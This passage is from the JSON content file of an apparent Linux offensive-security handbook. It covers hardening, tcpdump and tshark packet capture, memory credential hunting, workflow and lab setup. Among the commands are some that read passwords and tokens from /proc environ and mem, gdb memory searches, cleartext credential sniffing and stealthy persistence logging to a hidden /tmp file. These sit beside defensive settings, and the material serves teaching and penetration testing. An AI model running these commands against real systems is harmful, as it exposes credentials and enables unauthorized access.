crashed a service or caused load. 12. Monitor file changes Powerful for privilege escalation and persistence detection. watch -n 1 \"ls -l /etc/passwd\" Or continuous diff: diff \u003c(ls /etc) \u003c(ls /etc) 13. Silent Logging for Persistence Collect system data without drawing attention. ps aux >> /tmp/.cache 2>/dev/null id >> /tmp/.cache whoami >> /tmp/.cache uname -a >> /tmp/.cache Advanced: Modern hardening baseline Hardening is more than disabling services. A modern baseline combines kernel settings, mandatory access control, verified boot and continuous drift detection. sudo systemd-analyze security --no-pager sudo lynis audit system sudo aa-status getenforce 2>/dev/null sudo aide --check sudo fapolicyd-cli --status 2>/dev/null mokutil --sb-state 2>/dev/null sudo bootctl status Use OpenSCAP when a formal benchmark is required. List the profiles in the installed SCAP source data stream first, then evaluate the profile that matches your distribution and policy. The example selects the first data stream it finds; set SSG_FILE explicitly when more than one distribution is installed. SCAP_DIR=/usr/share/xml/scap/ssg/content SSG_FILE=$(find \"$SCAP_DIR\" -maxdepth 1 -name 'ssg-*-ds.xml' | head -n 1) oscap info \"$SSG_FILE\" | head -n 40 sudo oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_cis \\ --results /var/tmp/oscap-results.xml \"$SSG_FILE\" Add these controls where they fit the environment: Enforce AppArmor or SELinux profiles for exposed services. Use fapolicyd or an allowlist to limit execution in high-value segments. Enable AIDE or another file integrity monitor and ship the baseline off-host. Require Secure Boot and measure boot with TPM 2.0 where the hardware supports it. Restrict removable devices with USBGuard. Keep /etc/sysctl.d/ under version control and verify it after updates. Review systemd-analyze security scores for internet-facing units and remove unnecessary capabilities, devices and writable paths. A hardening score is not a guarantee. Validate that the control blocks the behavior you care about, and keep an exception log with an owner and expiry date. Pentester Perspective Hardened systems: Reduce common privilege escalation paths Leave meaningful logs Increase attacker cost Detect noise quickly Understanding defender configs = better Red Teaming. Lab Task Install auditd on a VM. Add rules from section 3. Perform system actions (chmod, passwd, sudo). Use ausearch to trace everything. Write a short report on high-value findings."},{"kind":"chapter","number":28,"order":28,"href":"chapters/28-network-sniffing-and-packet-capture.html","slug":"28-network-sniffing-and-packet-capture","page":"28-network-sniffing-and-packet-capture.html","title":"Linux Network Sniffing and Packet Capture","short":"Packet capture","summary":"Use tcpdump and tshark to capture, filter and read live traffic.","part":"defense","partNum":"05","partName":"Defense and workflow","readMinutes":7,"words":411,"sections":10,"codeBlocks":20,"headings":[{"id":"how-sniffing-works","text":"How Sniffing Works","level":3},{"id":"1-interface-enumeration","text":"1. Interface Enumeration","level":2},{"id":"2-basic-tcpdump-usage","text":"2. Basic tcpdump Usage","level":2},{"id":"3-filtering-packets-like-a-pro","text":"3. Filtering Packets Like a Pro","level":2},{"id":"4-extracting-credentials-tokens-and-secrets","text":"4. Extracting Credentials, Tokens & Secrets","level":2},{"id":"5-tshark-deep-packet-analysis","text":"5. Tshark Deep Packet Analysis","level":2},{"id":"6-real-time-monitoring","text":"6. Real-Time Monitoring","level":2},{"id":"7-detect-suspicious-activity","text":"7. Detect Suspicious Activity","level":2},{"id":"8-hacker-workflow-example","text":"8. Hacker Workflow Example","level":2},{"id":"9-operator-tips","text":"9. Operator Tips","level":2}],"text":"Network traffic analysis is one of the most critical skills for hackers, defenders, and red-team operators. This chapter covers tcpdump, Tshark, live packet analysis, filtering, and real-world exploitation techniques. Network sniffing and packet capture involve intercepting network traffic and analyzing the data packets that traverse a network. While it is an essential technique for ethical hackers to secure networks, malicious actors use it to steal sensitive information such as passwords and credentials, particularly over unsecured public Wi-Fi networks. How Sniffing Works Attackers often employ techniques like ARP poisoning to redirect network traffic through their devices, allowing them to capture packets not originally intended for them. Unencrypted data within these packets (like unencrypted login credentials) can be read in plain text. 1. Interface Enumeration ip a tcpdump -D Common interfaces: eth0 → server NIC wlan0 → wireless any → capture from all interfaces 2. Basic tcpdump Usage Capture all packets: tcpdump -i eth0 Write packets to file: tcpdump -i eth0 -w dump.pcap Limit packet count: tcpdump -i eth0 -c 100 3. Filtering Packets Like a Pro Only TCP: tcpdump -i eth0 tcp Only port 22: tcpdump -i eth0 port 22 Only HTTP: tcpdump -i eth0 'tcp port 80' Target a specific host: tcpdump host 10.10.10.50 4. Extracting Credentials, Tokens & Secrets Cleartext packet extraction: tcpdump -A -i eth0 'tcp port 80' DNS query capture: tcpdump -i any port 53 Useful for: API key leaks IoT device passwords Misconfigured internal services 5. Tshark Deep Packet Analysis List supported protocols: tshark -G protocols Follow TCP streams: tshark -r dump.pcap -z follow,tcp,ascii,0 Filter HTTP requests: tshark -r dump.pcap -Y \"http.request\" Export extracted objects: tshark -r dump.pcap --export-objects http,./extracted 6. Real-Time Monitoring Live DNS monitor: tcpdump -i any -n port 53 Detect SSH brute-force: tcpdump -i any 'tcp port 22 and (tcp[tcpflags] & tcp-syn != 0)' Detect beaconing: tcpdump -i any udp and port 53 7. Detect Suspicious Activity Outbound SYN packets to unknown networks: tcpdump -i any 'tcp[tcpflags] & tcp-syn != 0 and not net 10.0.0.0/8' Large packet exfiltration: tcpdump -i eth0 'tcp and (len > 1000)' 8. Hacker Workflow Example # 1. Capture traffic tcpdump -i eth0 -w full.pcap # 2. Extract HTTP requests tshark -r full.pcap -Y \"http.request\" # 3. Export files tshark -r full.pcap --export-objects http,./loot 9. Operator Tips Always store your captures; they are gold later. Filters keep captures small and efficient. Tshark is perfect for headless servers. DNS, HTTP, SSH = highest signal sources. Monitor live during privilege escalation attempts."},{"kind":"chapter","number":29,"order":29,"href":"chapters/29-linux-memory-analysis-and-credential-hunting.html","slug":"29-linux-memory-analysis-and-credential-hunting","page":"29-linux-memory-analysis-and-credential-hunting.html","title":"Linux Memory Analysis and Credential Hunting","short":"Memory analysis","summary":"Inspect procfs and live processes to find credentials and runtime evidence.","part":"defense","partNum":"05","partName":"Defense and workflow","readMinutes":6,"words":527,"sections":10,"codeBlocks":13,"headings":[{"id":"1-why-memory-matters","text":"1. Why Memory Matters","level":2},{"id":"2-understanding-proc","text":"2. Understanding /proc","level":2},{"id":"3-credential-hunting-via-environment-variables","text":"3. Credential Hunting via Environment Variables","level":2},{"id":"4-extracting-strings-from-process-memory","text":"4. Extracting Strings from Process Memory","level":2},{"id":"5-live-target-discovery","text":"5. Live Target Discovery","level":2},{"id":"6-attaching-to-processes-gdb-lite","text":"6. Attaching to Processes (gdb-lite)","level":2},{"id":"7-privilege-escalation-angle","text":"7. Privilege Escalation Angle","level":2},{"id":"8-restrictions-and-protections","text":"8. Restrictions & Protections","level":2},{"id":"advanced-modern-process-memory-and-kernel-keyring","text":"Advanced: Modern process memory and kernel keyring","level":2},{"id":"9-defender-awareness","text":"9. Defender Awareness","level":2}],"text":"Linux memory analysis is an advanced but extremely powerful skill for hackers, red teamers, and incident responders. Many secrets never touch disk - they live only in memory. Linux memory analysis for credential hunting involves capturing volatile data (RAM) to identify sensitive information like passwords, SSH keys, and session tokens that may not exist on disk. 1. Why Memory Matters Sensitive data often found only in RAM: cleartext passwords API tokens database credentials decrypted configuration values session secrets If you can inspect process memory, you can bypass many traditional security controls. 2. Understanding /proc The /proc filesystem exposes live process information. List processes: ls /proc Inspect a specific process: ls /proc/\u003cpid> Important files: cmdline → startup command environ → environment variables maps → memory layout mem → raw process memory 3. Credential Hunting via Environment Variables Many applications load secrets via environment variables. cat /proc/\u003cpid>/environ | tr '\\0' '\\n' Look for: PASSWORD TOKEN SECRET AWS_ DB_ 4. Extracting Strings from Process Memory If permissions allow: strings /proc/\u003cpid>/mem | grep -i pass Inspect mapped regions: cat /proc/\u003cpid>/maps Advanced extraction: dd if=/proc/\u003cpid>/mem bs=1 skip=\u003cstart> count=\u003csize> 5. Live Target Discovery Check running services: ps aux | grep mysql ps aux | grep postgres ps aux | grep redis Secrets often appear in: command-line arguments memory buffers config loaders 6. Attaching to Processes (gdb-lite) If allowed: gdb -p \u003cpid> Search memory: find &__data_start__, +9999999, \"password\" Detach safely: detach quit 7. Privilege Escalation Angle Potential escalation paths: reading root-owned process memory attaching to privileged daemons leaking secrets from SUID helpers 8. Restrictions & Protections ptrace may be restricted (ptrace_scope) /proc/\u003cpid>/mem often requires same UID or root hardened kernels reduce memory visibility Advanced: Modern process memory and kernel keyring Linux does not have a single credential store. Secrets live in environment variables, command lines, configuration files, agent sockets, the kernel keyring and process memory. Modern access often goes through ptrace, process_vm_readv, memfd or BPF rather than /proc/\u003cpid>/mem alone. Check restrictions: cat /proc/sys/kernel/yama/ptrace_scope cat /proc/sys/kernel/perf_event_paranoid cat /proc/sys/kernel/unprivileged_bpf_disabled cat /proc/\u003cpid>/maps Memory access examples, lab only: gcore -o /tmp/core \u003cpid> grep -aE 'password|token|secret|API_KEY' /proc/\u003cpid>/environ keyctl show Modern primitives: process_vm_readv reads another process's memory without a full ptrace stop, subject to the same Yama policy. memfd_create creates an anonymous file; combined with fexecve it supports fileless execution and is a common detection target. pidfd provides race-free process handles and is increasingly used by supervisors and security tools. perf_event_open and BPF maps can expose kernel and user memory events; both are privileged and audited. The kernel keyring (keyctl) stores keys for services and users; inspect permissions before assuming a key is readable. Credential targets: systemd credentials and environment files. SSH agent sockets and ~/.ssh keys. Cloud instance metadata tokens, especially IMDSv1. Container secrets mounted as files. Password manager and GPG agent caches. Defenses: sudo sysctl -w kernel.yama.ptrace_scope=2 sudo sysctl -w kernel.perf_event_paranoid=3 sudo sysctl -w kernel.unprivileged_bpf_disabled=2 Also use hidepid=2 on /proc, restrict CAP_SYS_PTRACE, and audit process_vm_readv, ptrace, memfd_create and bpf syscalls. Validate that monitoring and debugging tools still work before enforcing these settings. 9. Defender Awareness Blue teams should: avoid secrets in env vars restrict ptrace usage monitor /proc access enforce memory-safe coding practices Linux for Hackers (2026 Edition)"},{"kind":"chapter","number":30,"order":30,"href":"chapters/30-building-your-linux-hacking-workflow.html","slug":"30-building-your-linux-hacking-workflow","page":"30-building-your-linux-hacking-workflow.html","title":"Building Your Linux Hacking Workflow","short":"Workflow","summary":"Assemble recon, automation, logging and reporting into one repeatable workflow.","part":"defense","partNum":"05","partName":"Defense and workflow","readMinutes":5,"words":599,"sections":11,"codeBlocks":10,"headings":[{"id":"1-the-hacker-mindset","text":"1. The Hacker Mindset","level":2},{"id":"2-standard-workflow","text":"2. Standard Workflow","level":2},{"id":"3-workspace-setup","text":"3. Workspace Setup","level":2},{"id":"4-logging-everything","text":"4. Logging Everything","level":2},{"id":"5-essential-commands","text":"5. Essential Commands","level":2},{"id":"6-automation","text":"6. Automation","level":2},{"id":"7-build-your-toolkit","text":"7. Build Your Toolkit","level":2},{"id":"8-red-team-vs-blue-team","text":"8. Red Team vs Blue Team","level":2},{"id":"9-keep-learning","text":"9. Keep Learning","level":2},{"id":"advanced-a-modern-operator-workflow","text":"Advanced: A modern operator workflow","level":2},{"id":"10-final-advice","text":"10. Final Advice","level":2}],"text":"Welcome to the final chapter of the Linux for Hackers guide. This chapter focuses on building a professional Linux hacking workflow by combining recon, logging, automation, privilege escalation, monitoring, and reporting into one repeatable methodology. 1. The Hacker Mindset Strong operators: document everything automate repetitive tasks minimize noise stay organized constantly learn Workflow matters more than memorizing commands. 2. Standard Workflow A practical engagement flow: Recon Enumeration Service Analysis Exploitation Privilege Escalation Persistence Logging Cleanup 3. Workspace Setup Create a clean structure: mkdir -p ~/targets/{logs,loot,scans,exploits} Recommended folders: logs/ scans/ loot/ exploits/ 4. Logging Everything Save outputs during every phase. nmap -sV target | tee -a scans/nmap.txt Quick notes: echo \"[+] SSH discovered on port 22\" >> notes.txt 5. Essential Commands Networking: ip a ss -tulnp tcpdump -i any Processes: ps aux top lsof -i Privilege escalation: sudo -l find / -perm -4000 2>/dev/null getcap -r / 2>/dev/null Monitoring: tail -f /var/log/auth.log journalctl -xe 6. Automation Automate repetitive tasks: recon scripts aliases logging wrappers enumeration scripts Example alias: alias ports='ss -tulnp' 7. Build Your Toolkit Maintain: recon utilities privilege escalation helpers packet capture tools persistence detection scripts custom Bash functions Store them in GitHub repos. 8. Red Team vs Blue Team Red Team: stealth exploitation persistence evasion Blue Team: monitoring detection hardening response Learning both improves your operational thinking. 9. Keep Learning Keep building after this guide: practice CTFs build labs study CVEs read write-ups contribute to GitHub automate your workflow Linux mastery comes from repetition. Advanced: A modern operator workflow The difference between a hobbyist and an operator is repeatability. Modern workflows use infrastructure as code, reproducible labs, evidence pipelines and automation that can be reviewed. Lab as code: ansible-playbook -i inventory lab.yml --check vagrant snapshot save clean multipass launch --name lab --cpus 2 --memory 4G --disk 20G Use snapshots before every exploit attempt, and keep a clean baseline for comparison. Evidence pipeline: RUN=\"evidence/$(date -u +%Y%m%dT%H%M%SZ)\" mkdir -p \"$RUN\" export RUN script -q \"$RUN/session.log\" -c ' ss -tanp > \"$RUN/network.txt\" ps auxf > \"$RUN/processes.txt\" sha256sum \"$RUN\"/* > \"$RUN/hashes.txt\" ' script -c runs the evidence commands in a recorded shell and returns when they finish. To record an interactive session instead, run script -q \"$RUN/session.log\" and type exit when you are done; the commands after it will not run until the recorded shell exits. Pair either form with a timestamped notes file and the exact commands you ran. Automation: Keep a Makefile or task runner for repeatable scans and reports. Generate SBOMs with syft, scan with trivy and osv-scanner, verify signatures with cosign. Use jq and yq to normalize JSON and YAML before comparison. Run ansible-playbook --check before applying changes to a lab. Store findings as Markdown with a stable ID, severity, evidence path and remediation. AI-assisted work: Use local models for summarizing logs and drafting reports, but never send client data to a third-party service without approval. Treat model output as a hypothesis. Verify every command and CVE against a primary source. Keep prompts and outputs out of evidence unless they are part of the investigation. Operator checklist: Scope and written authorization are current. Lab snapshot exists and is named. Time is synchronized in UTC. Logging starts before testing. Every finding has a reproducible command and an impact statement. Cleanup removes test accounts, keys, services and network rules. Report separates facts, assumptions and recommendations. This is the workflow that turns a collection of tricks into a repeatable practice. 10. Final Advice Never stop practicing. Never stop documenting. Always think operationally. Consistency creates expertise. Medium: Offensive security write-ups & deep-dives End of the guide - Linux for Hackers (2026 Edition)"}],"foundations":[{"kind":"foundation","number":1,"order":101,"href":"foundations/01-linux-mental-model.html","slug":"01-linux-mental-model","page":"01-linux-mental-model.html","title":"Linux Mental Model","short":"Linux mental model","summary":"Build a working model of the kernel, shell, users and filesystem before you touch a command.","part":"foundations","partNum":"HF","partName":"Linux Foundations","readMinutes":17,"words":2753,"sections":18,"codeBlocks":14,"headings":[{"id":"the-four-layers","text":"The four layers","level":2},{"id":"the-component-stack-in-more-detail","text":"The component stack in more detail","level":2},{"id":"linux-and-windows-a-practical-comparison","text":"Linux and Windows: a practical comparison","level":2},{"id":"distributions-are-packaging-choices","text":"Distributions are packaging choices","level":2},{"id":"everything-is-a-file-until-it-is-not","text":"Everything is a file, until it is not","level":2},{"id":"the-filesystem-hierarchy","text":"The filesystem hierarchy","level":2},{"id":"users-groups-and-ownership","text":"Users, groups and ownership","level":2},{"id":"how-a-command-runs","text":"How a command runs","level":2},{"id":"processes-are-the-unit-of-execution","text":"Processes are the unit of execution","level":2},{"id":"the-shell-is-a-programming-environment","text":"The shell is a programming environment","level":2},{"id":"kernel-space-user-space-and-system-calls","text":"Kernel space, user space and system calls","level":2},{"id":"shells-terminals-and-sessions","text":"Shells, terminals and sessions","level":2},{"id":"mounts-namespaces-and-containers","text":"Mounts, namespaces and containers","level":2},{"id":"the-unix-philosophy","text":"The Unix philosophy","level":2},{"id":"a-study-method-that-works","text":"A study method that works","level":2},{"id":"lab-read-your-own-system","text":"Lab: read your own system","level":2},{"id":"common-mistakes","text":"Common mistakes","level":2},{"id":"checkpoint","text":"Checkpoint","level":2}],"text":"Linux is not a single program. It is a family of operating systems built around the same kernel, the same core utilities and a shared way of thinking about files, users and processes. Before you memorize commands, build a model of how the pieces fit together. Every later chapter, from permissions to containers, depends on this model. The four layers Think of a Linux system as four layers: Hardware. CPU, memory, disks, network cards and peripherals. Kernel. The privileged core that schedules processes, manages memory, talks to hardware and enforces access control. User space. Programs, libraries, services and the filesystem tree. Shell. A command interpreter that lets you launch programs, connect them together and automate work. The kernel is the only layer that runs with full hardware privilege. User programs ask the kernel for services through system calls. When you run ls, the shell finds the program, the kernel starts it, and the program asks the kernel to read a directory and write the result to your terminal. The component stack in more detail The four layers are easier to remember when you place the supporting pieces between the shell and the kernel: +------------------------------------------------------+ | User applications: editors, browsers, servers, tools | +------------------------------------------------------+ | Shell: Bash, Zsh, Fish, Dash | +------------------------------------------------------+ | System utilities: ls, grep, systemctl, ip | +------------------------------------------------------+ | System libraries: glibc, OpenSSL, libcurl | +------------------------------------------------------+ | Linux kernel: processes, memory, files, network | +------------------------------------------------------+ | Hardware: CPU, RAM, disks, network, peripherals | +------------------------------------------------------+ System utilities and libraries are part of user space, but they sit between your commands and the kernel. A program such as curl may use libcurl, the C library and several system calls. The shell is also an ordinary user-space program. It does not run inside the kernel, even though it feels like part of the operating system. Device drivers are the kernel's hardware-facing code. Some are built into the kernel image, and others are loaded as modules. A driver bug can affect the whole machine because the driver runs with kernel privilege. That is one reason kernel updates and hardware compatibility matter. Linux and Windows: a practical comparison Linux and Windows solve similar problems with different defaults. The useful question is not which one is universally better. It is which one fits the workload, the software, the support model and the skills of the people who will operate it. Area Linux Windows Licensing Mostly open source, with commercial support available Commercial licenses, with some free editions Filesystem One tree with mount points, usually case-sensitive Drive letters, backslash paths, usually case-insensitive Shell Bash, Zsh, Fish and other shells with text pipelines PowerShell and Command Prompt Software Distribution repositories, packages and source builds Installers, Microsoft Store and winget Updates Per-package updates; kernel updates may require a reboot Cumulative updates; reboots are common Permissions Owner, group, mode bits, root and capabilities ACLs, Administrator accounts and UAC Desktop Many distributions and desktop environments Broad commercial hardware and application support Servers Common for web, cloud and container platforms Common in Microsoft-centric environments Containers Native namespaces and cgroups Containers through WSL2 or a virtual machine Automation Shell scripts, systemd, Ansible and other tools PowerShell, Task Scheduler and Group Policy Linux is not automatically more secure. It has malware, vulnerable services, supply chain attacks and misconfiguration. A hardened Linux server and a hardened Windows server have more in common than either has with an ignored default install. Linux is also not free in total cost: staff time, training, support contracts and migration work are real expenses. The practical advantages of Linux are often about control and composition. You can inspect the system, replace components, automate small pieces and run the same software on a laptop, a server and a container. The practical advantages of Windows are often about commercial software, hardware support and a managed desktop experience. Learn the model behind the commands, and you can move between them without treating either system as magic. Distributions are packaging choices A distribution combines the Linux kernel with a package manager, init system, libraries, installer and default tools. Common families include: Family Examples Package tools Typical init Debian Debian, Ubuntu, Kali apt, dpkg systemd Red Hat Fedora, RHEL, Rocky dnf, rpm systemd Arch Arch, EndeavourOS pacman systemd SUSE openSUSE zypper, rpm systemd Alpine Alpine apk OpenRC The commands in this guide focus on Debian and Ubuntu because they are common in labs, but the concepts transfer. When a command differs, check your distribution's documentation. Everything is a file, until it is not Linux exposes many resources through the filesystem. Regular files, directories, devices, sockets and pipes all appear as file types. This is why tools such as cat, ls and stat are so useful. Some things are not ordinary files: Processes appear under /proc as a view generated by the kernel. Kernel settings appear under /sys. Network connections are not files you can simply edit. Mounted filesystems attach one tree to another at a mount point. The phrase \"everything is a file\" is a useful simplification, not a law. Treat it as a hint about where to look, not a guarantee that every resource behaves like a text file. The filesystem hierarchy Linux distributions follow the Filesystem Hierarchy Standard closely enough that you can move between systems with confidence. Path Purpose / Root of the entire tree /bin, /usr/bin Essential and general user commands /sbin, /usr/sbin System administration commands /etc Host-specific configuration /home User home directories /root Home directory for the root account /var Variable data such as logs, caches and spools /tmp Temporary files, often cleared at boot /opt Optional third-party software /usr Programs, libraries and read-only data /dev Device files /proc Process and kernel information /sys Kernel and hardware interfaces /boot Kernel, initramfs and bootloader files /srv Data served by system services /run Runtime state created since boot /usr/local Locally installed software and libraries /lost+found Recovered files after repair on ext filesystems /mnt, /media Temporary and removable mount points On modern systems, /bin, /sbin and /lib are often symbolic links into /usr. That is normal. The important idea is that the tree is a single namespace: disks and partitions are attached somewhere inside it. Some paths are conventions rather than universal rules. Ubuntu may add /snap, containers often have no /boot, and /data is a common mount point but not part of the standard hierarchy. When you are unsure, read the manual page for the hierarchy on systems that provide it: man hier ls -ld /boot /srv /run /usr/local Users, groups and ownership Every process runs as a user and belongs to one or more groups. Every file has an owner, a group and a permission mode. The kernel checks those identities when a process tries to read, write or execute something. The root account, UID 0, bypasses most permission checks. That is why sudo is powerful and why it deserves care. A normal user should do normal work. Elevate only for the specific command that needs it. You can inspect your identity with: id whoami groups You will return to these details in the permissions chapter. For now, remember that access is always a relationship between a process identity and a resource. How a command runs When you type a command, several things happen: The shell parses the line into words, quotes, redirections and pipes. It checks whether the first word is a shell builtin, a function or an external program. For an external program, it searches the directories listed in PATH. The kernel creates a new process and loads the program. The program runs, writes output and returns an exit status. The shell uses that status to decide what to do next. You can see the search path and the shell you are using: echo \"$SHELL\" echo \"$PATH\" type ls command -v ls type and command -v are often more informative than which, because they know about aliases, functions and builtins. Processes are the unit of execution A process is a running program with its own memory, file descriptors and identity. Processes have a PID, a parent PID and a state. They can be running, sleeping, stopped or waiting for input. The kernel schedules processes, enforces limits and delivers signals. A signal is a small notification that asks a process to do something, such as terminate, reload or continue. You will use signals when you manage jobs and services. Inspect the process tree with: ps -ef ps aux top The first command shows a portable full listing. The second shows BSD-style resource usage. top updates live. Use q to quit. The shell is a programming environment The shell is not just a place to type commands. It has variables, conditionals, loops, functions, redirection and pipelines. It can run a sequence of commands, react to failures and transform text. That power is why shell scripting is part of this guide. It is also why quoting matters. The shell expands variables, globs and command substitutions before the program runs. If you do not control that expansion, spaces and special characters can change the meaning of a command. A safe habit is to quote variable expansions: name=\"Linux Foundations\" printf '%s\\n' \"$name\" The quotes keep the value as one argument even when it contains spaces. Kernel space, user space and system calls The CPU does not treat every instruction equally. Most modern processors have at least two privilege levels. Linux uses them to separate kernel space from user space. Kernel space runs with full hardware access. It can touch memory, devices and privileged CPU instructions. User space runs ordinary programs with restricted access. A program cannot write to a disk or open a network socket by itself. When a user-space program needs a privileged operation, it makes a system call. The CPU switches into the kernel, performs the operation, and returns a result. Common system calls include open, read, write, close, fork, execve, socket and mmap. You can see system calls without reading kernel source: strace -c ls / strace -e openat ls /etc/hostname man 2 open strace -c summarizes the calls a program made and the time spent in each. strace -e openat shows file opens. man 2 open opens section 2 of the manual, which documents system calls rather than shell commands. This distinction explains a lot of Linux behavior. A permission error is usually the kernel refusing a system call. A crash in a device driver can affect the whole machine because the driver runs in kernel space. A container feels isolated but still shares the host kernel, which is why kernel vulnerabilities matter. Shells, terminals and sessions People often use the words terminal, console, shell and command line as if they were the same thing. They are separate layers: Layer Job Terminal emulator Draws a text window and sends keystrokes, such as GNOME Terminal, Konsole, Alacritty or Windows Terminal TTY The kernel's text device or pseudo-terminal that connects a session to a program Shell Parses commands and launches programs, such as Bash, Zsh, Fish or Dash Command line The text you type and the output you receive A login shell is started when you log in. A non-login shell is started by a program or a terminal window. An interactive shell reads commands from a person. A non-interactive shell runs a script. Bash reads different startup files depending on those modes, which is why an alias can work in your terminal but fail in a cron job. Inspect the current shell and session: echo \"$0\" echo \"$SHELL\" ps -p $$ -o pid,ppid,tty,cmd shopt login_shell $0 is the name used to start the current shell. $SHELL is your configured login shell, not necessarily the shell running this command. $$ is the current shell's PID. ps shows its parent and controlling terminal. shopt login_shell is a Bash-specific check. A terminal multiplexer keeps a session alive when the terminal window closes. tmux and screen are common choices. They are useful on remote servers because a dropped connection does not kill your work. tmux new -s study tmux attach -t study tmux ls Inside tmux, Ctrl+B then D detaches. Reattach with tmux attach -t study. The session continues running on the server. Mounts, namespaces and containers Linux has one directory tree, but that tree can be assembled from many filesystems. A mount attaches a filesystem at a directory called a mount point. findmnt findmnt / cat /proc/mounts findmnt prints the mount tree in a readable form. /proc/mounts is the kernel's current view. You will see the root filesystem, pseudo filesystems such as proc, sysfs and tmpfs, and possibly separate mounts for /boot, /home or /var. A bind mount exposes an existing directory at a second location: sudo mkdir -p /mnt/etc-copy sudo mount --bind /etc /mnt/etc-copy findmnt /mnt/etc-copy sudo umount /mnt/etc-copy Bind mounts are useful for chroots, containers and recovery work. They do not copy data. Both paths point at the same underlying files. Namespaces take isolation further. A mount namespace gives a process its own view of the mount tree. PID, network, user, IPC, UTS and cgroup namespaces isolate other resources. Containers are built from namespaces plus cgroups and a layered filesystem image. They are not tiny virtual machines. They share the host kernel. Inspect namespaces on a running system: lsns ls -l /proc/$$/ns lsns lists namespaces and their processes. /proc/$$/ns shows the namespaces of your shell. Comparing namespace identifiers tells you whether two processes share the same view. The Unix philosophy Linux inherits a design culture from Unix. The short version is: Write programs that do one thing well. Write programs that work together. Use text streams as a common interface. Prefer composition over a single huge program. Make behavior predictable and scriptable. This is why grep, cut, sort, uniq, wc and sed are small and why pipes matter. A pipeline is not a workaround. It is the intended way to solve many problems. A graphical tool can be friendlier for a one-off task, but a command-line pipeline is easier to repeat, review and automate. Learn both. Use the graphical tool when it saves time, then learn the command that does the same job. The philosophy has limits. Not every resource is text. Binary protocols, databases and performance data often need specialized tools. The point is to look for composable pieces before reaching for a giant monolith. A study method that works Linux rewards deliberate practice. Reading commands is not enough. You need to run them, break things and recover. A practical loop: Predict. Before running a command, say what you expect it to do. Run. Execute it in a lab, not on a system you cannot rebuild. Observe. Read the output, the exit status and the logs. Explain. Write one sentence describing what happened. Change one variable. Try a different option or path. Break it. Cause a safe failure and read the error. Recover. Undo the change and confirm the system is healthy. Record. Keep a short note with the command, the result and the lesson. Take a virtual machine snapshot before risky work. Keep a lab notes file: mkdir -p ~/linux-foundations/notes printf '%s\\n' '# Linux notes' >> ~/linux-foundations/notes/commands.md When you learn a new command, record the manual section and one real example. Future you will thank present you. Avoid copying long commands you do not understand. Break them into pieces. Run the pieces separately. Read the manual for every option that changes state. That habit prevents most accidents. Lab: read your own system Run these commands in a lab machine or a safe Linux environment. Write down what each one tells you. uname -a cat /etc/os-release echo \"$SHELL\" echo \"$PATH\" id pwd ls -la / df -h ps -ef | head Then answer: Which distribution and kernel version are you running? Which shell starts when you open a terminal? Which directories are on your PATH? Which filesystem is mounted at /? Which process is the parent of your shell? Common mistakes Assuming every Linux system uses the same package manager. Editing files in /etc without a backup or a plan. Running ordinary tasks as root because it is convenient. Treating PATH as a fixed list instead of a search order. Forgetting that a process identity determines what a command can access. Checkpoint You are ready to continue when you can explain: The difference between the kernel, the shell and a distribution. Why /proc and /sys are special. What the filesystem hierarchy is for. How the shell finds and starts a command. Why users, groups and permissions are connected. The next part sets up a safe lab and teaches the command line itself."},{"kind":"foundation","number":2,"order":102,"href":"foundations/02-lab-setup-and-command-line.html","slug":"02-lab-setup-and-command-line","page":"02-lab-setup-and-command-line.html","title":"Lab Setup and the Command Line","short":"Lab and command line","summary":"Choose a safe lab, read the prompt and learn how commands, help and exit codes fit together.","part":"foundations","partNum":"HF","partName":"Linux Foundations","readMinutes":18,"words":2387,"sections":17,"codeBlocks":27,"headings":[{"id":"choose-a-lab","text":"Choose a lab","level":2},{"id":"use-a-container-as-a-disposable-lab","text":"Use a container as a disposable lab","level":2},{"id":"know-your-prompt","text":"Know your prompt","level":2},{"id":"the-anatomy-of-a-command","text":"The anatomy of a command","level":2},{"id":"get-help-without-guessing","text":"Get help without guessing","level":2},{"id":"exit-status-and-command-chaining","text":"Exit status and command chaining","level":2},{"id":"quoting-and-expansion","text":"Quoting and expansion","level":2},{"id":"redirection-and-pipes","text":"Redirection and pipes","level":2},{"id":"terminal-habits","text":"Terminal habits","level":2},{"id":"manual-sections-and-command-discovery","text":"Manual sections and command discovery","level":2},{"id":"startup-files-and-environment","text":"Startup files and environment","level":2},{"id":"aliases-functions-and-history","text":"Aliases, functions and history","level":2},{"id":"how-the-shell-parses-a-command","text":"How the shell parses a command","level":2},{"id":"more-redirection","text":"More redirection","level":2},{"id":"lab-build-a-workspace","text":"Lab: build a workspace","level":2},{"id":"common-mistakes","text":"Common mistakes","level":2},{"id":"checkpoint","text":"Checkpoint","level":2}],"text":"You do not need a dedicated server to learn Linux. You need a safe environment that you can break, rebuild and snapshot. This part covers the lab choices, the shape of a command line, and the habits that make the terminal predictable. Choose a lab Option Good for Trade-offs Virtual machine Full Linux install, snapshots, networking Uses RAM and disk WSL2 on Windows Fast access to a Linux userland Some kernel and service differences Cloud instance Remote access and realistic networking Costs money, needs careful scope Live USB Hardware testing and recovery Changes are lost unless persisted Container Disposable command practice Not a full init or kernel environment For this handbook, a virtual machine is the best default. Install a Debian or Ubuntu server image, give it at least two CPU cores and 4 GB of RAM, and take a snapshot before you change anything important. If you use a container, remember that it shares the host kernel. Container root is not automatically host root, but a misconfigured container can still expose the host. Keep the lab isolated. Use a container as a disposable lab A container is the fastest way to get a Linux userland on Windows, macOS or Linux. Install Docker Desktop or Docker Engine, then start an Ubuntu container: mkdir -p \"$HOME/linux-lab\" docker run --rm -it \\ --name linux-lab \\ --hostname linux-lab \\ --cpus 2 \\ --memory 4g \\ -v \"$HOME/linux-lab:/data\" \\ ubuntu:24.04 bash This starts an interactive container with a stable name, a hostname, two CPU cores, 4 GB of memory and a bind mount for files you want to keep. The --rm flag deletes the container when you exit. The host directory survives. On Windows, run the command from WSL2 or use a path that Docker Desktop is allowed to share. Flag Effect --rm Delete the container when it exits -it Attach an interactive terminal --name linux-lab Give the container a stable name --hostname linux-lab Set the hostname inside the container --cpus 2 Limit the container to two CPU cores --memory 4g Limit the container to 4 GB of memory -v \"$HOME/linux-lab:/data\" Mount a host directory at /data -p 127.0.0.1:8080:80 Publish a container port on loopback only --env TZ=UTC Set an environment variable ubuntu:24.04 bash Use this image and run Bash Inspect and manage the lab: docker ps docker ps -a docker start linux-lab docker attach linux-lab docker exec -it linux-lab bash docker stop linux-lab docker rm linux-lab docker system df docker system prune With --rm, there is no stopped container to restart after you exit. Remove --rm when you want a persistent container that you can stop and start later. docker exec is often safer than docker attach because it starts a second shell and does not disturb the container's main process. Never mount /var/run/docker.sock into a lab container. 